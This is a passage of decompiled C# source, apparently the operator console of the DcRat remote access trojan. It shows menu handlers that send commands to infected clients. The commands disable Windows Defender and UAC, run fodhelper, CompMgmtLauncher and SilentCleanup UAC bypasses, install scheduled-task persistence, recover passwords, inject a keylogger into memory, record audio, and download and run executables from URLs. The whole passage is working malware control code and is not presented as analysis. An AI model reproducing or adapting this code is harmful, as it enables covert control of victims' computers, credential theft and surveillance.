        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormProcessManager) Application.OpenForms["processManager:" + selectedClient.ID] == null)
          {
            FormProcessManager formProcessManager = new FormProcessManager();
            formProcessManager.Name = "processManager:" + selectedClient.ID;
            formProcessManager.Text = "processManager:" + selectedClient.ID;
            formProcessManager.F = this;
            formProcessManager.ParentClient = selectedClient;
            formProcessManager.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        Clients[] selectedClients;
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          openFileDialog.Multiselect = true;
          if (openFileDialog.ShowDialog() != DialogResult.OK)
            return;
          MsgPack packet = new MsgPack();
          packet.ForcePathObject("Pac_ket").AsString = "sendFile";
          packet.ForcePathObject("Update").AsString = "false";
          MsgPack msgpack = new MsgPack();
          msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          selectedClients = this.GetSelectedClients();
          Clients[] clientsArray = selectedClients;
          for (int index1 = 0; index1 < clientsArray.Length; ++index1)
          {
            Clients client = clientsArray[index1];
            client.LV.ForeColor = Color.Red;
            string[] fileNames = openFileDialog.FileNames;
            string[] strArray = fileNames;
            for (int index2 = 0; index2 < strArray.Length; ++index2)
            {
              string file = strArray[index2];
              await Task.Run((Action) (() =>
              {
                packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
              }));
              ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), (object) msgpack.Encode2Bytes());
            }
            strArray = (string[]) null;
            fileNames = (string[]) null;
            client = (Clients) null;
          }
          clientsArray = (Clients[]) null;
        }
        selectedClients = (Clients[]) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        FormSendFileToMemory sendFileToMemory = new FormSendFileToMemory();
        int num = (int) sendFileToMemory.ShowDialog();
        if (sendFileToMemory.IsOK)
        {
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "sendMemory";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(sendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
          msgPack1.ForcePathObject("Inject").AsString = sendFileToMemory.comboBox1.SelectedIndex != 0 ? sendFileToMemory.comboBox2.Text : "";
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            selectedClient.LV.ForeColor = Color.Red;
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
        sendFileToMemory.Close();
        sendFileToMemory.Dispose();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string str = Interaction.InputBox("Message", "Message", "Controlled by DcRat");
        if (string.IsNullOrEmpty(str))
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "sendMessage";
        msgPack1.ForcePathObject("Message").AsString = str;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        string str = Interaction.InputBox("Visit website", "URL", "https://www.google.com");
        if (string.IsNullOrEmpty(str))
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "visitURL";
        msgPack1.ForcePathObject("URL").AsString = str;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
          if (openFileDialog.ShowDialog() == DialogResult.OK)
          {
            MsgPack msgPack1 = new MsgPack();
            msgPack1.ForcePathObject("Pac_ket").AsString = "wallpaper";
            msgPack1.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
            msgPack1.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
            MsgPack msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
            foreach (Clients selectedClient in this.GetSelectedClients())
              ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
    }

    private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
    {
    }

    private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
    {
    }

    private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "close";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "restart";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          if (openFileDialog.ShowDialog() != DialogResult.OK)
            return;
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "sendFile";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
          msgPack1.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
          msgPack1.ForcePathObject("Update").AsString = "true";
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            selectedClient.LV.ForeColor = Color.Red;
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "uninstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "pcOptions";
        msgPack1.ForcePathObject("Option").AsString = "restart";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "pcOptions";
        msgPack1.ForcePathObject("Option").AsString = "shutdown";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "pcOptions";
        msgPack1.ForcePathObject("Option").AsString = "logoff";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.notifyIcon1.Dispose();
      Environment.Exit(0);
    }

    private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
    {
      using (FormFileSearcher formFileSearcher = new FormFileSearcher())
      {
        if (formFileSearcher.ShowDialog() != DialogResult.OK || this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "fileSearcher";
        msgPack1.ForcePathObject("SizeLimit").AsInteger = (long) formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
        msgPack1.ForcePathObject("Extensions").AsString = formFileSearcher.numericUpDown1.Text;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          selectedClient.LV.ForeColor = Color.Red;
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
    }

    private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "information";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      if (MessageBox.Show((IWin32Window) this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
      {
        try
        {
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "disableDefedner";
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            if (selectedClient.LV.SubItems[this.lv_admin.Index].Text == "Admin")
              ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
        catch (Exception ex)
        {
          int num = (int) MessageBox.Show(ex.Message);
        }
      }
    }

    private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormAudio) Application.OpenForms["Audio Recorder:" + selectedClient.ID] == null)
          {
            FormAudio formAudio = new FormAudio();
            formAudio.Name = "Audio Recorder:" + selectedClient.ID;
            formAudio.Text = "Audio Recorder:" + selectedClient.ID;
            formAudio.F = this;
            formAudio.ParentClient = selectedClient;
            formAudio.Client = selectedClient;
            formAudio.Show();
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "uac";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if (selectedClient.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "uacbypass";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if (selectedClient.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
        new HandleLogs().Addmsg("Recovering...", Color.Black);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "uacbypass3";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if (selectedClient.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      if (MessageBox.Show((IWin32Window) this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
      {
        try
        {
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Pac_ket").AsString = "disableUAC";
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            if (selectedClient.LV.SubItems[this.lv_admin.Index].Text == "Admin")
              ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
        catch (Exception ex)
        {
          int num = (int) MessageBox.Show(ex.Message);
        }
      }
    }

    private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "uacbypass2";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if (selectedClient.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void DocumentToolStripMenuItem_Click(object sender, EventArgs e) => Process.Start("#");

    private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "sendMemory";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
        msgPack1.ForcePathObject("Inject").AsString = "";
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "Auto Keylogger:";
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "fakeBinder";
        msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
        msgPack1.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormNetstat) Application.OpenForms["Netstat:" + selectedClient.ID] == null)
          {
            FormNetstat formNetstat = new FormNetstat();
            formNetstat.Name = "Netstat:" + selectedClient.ID;
            formNetstat.Text = "Netstat:" + selectedClient.ID;
            formNetstat.F = this;
            formNetstat.ParentClient = selectedClient;
            formNetstat.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
    {
      string str = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
      if (string.IsNullOrEmpty(str))
        return;
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
        msgPack1.ForcePathObject("url").AsString = str;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string path = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
        if (string.IsNullOrEmpty(path))
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
        msgPack1.ForcePathObject("url").AsString = path;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        ListViewItem listViewItem1 = new ListViewItem();
        listViewItem1.Text = "SendFileFromUrl: " + Path.GetFileName(path);
        listViewItem1.SubItems.Add("0");
        listViewItem1.ToolTipText = Guid.NewGuid().ToString();
        if (this.listView44.Items.Count > 0)
        {
          foreach (ListViewItem listViewItem2 in this.listView44.Items)
          {
            if (listViewItem2.Text == listViewItem1.Text)
              return;
          }
        }
        Program.form1.listView44.Items.Add(listViewItem1);
        Program.form1.listView44.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem1.ToolTipText, false));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
